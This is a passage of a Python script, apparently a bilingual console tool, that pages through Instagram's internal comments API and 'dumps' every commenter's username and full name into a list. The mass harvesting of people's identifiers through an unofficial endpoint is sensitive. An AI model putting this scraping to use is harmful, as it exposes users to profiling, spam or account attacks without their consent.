                self.req = self.r.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min_cursor}').json()
                for self.usr in self.req['comments']:
                    self.data_ = self.usr['user']['username'] +'|'+ self.usr['user']['full_name']
                    if self.data_ not in dumpdata: dumpdata.append(self.data_)
                    print(f'[{H}+{K}] success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                self.abc = self.req['next_min_id']
                self.komentar(media_id, self.abc)
            except: return

def languages_set():
    clear()
    _lang = questionary.select("Pilih Bahasa | Select Language:",choices=["Indonesia", "English"],style=custom_style).ask().lower()
    if(_lang == 'english'): bahasa.append('en')
    else: bahasa.append('id')
    menu().instagram()
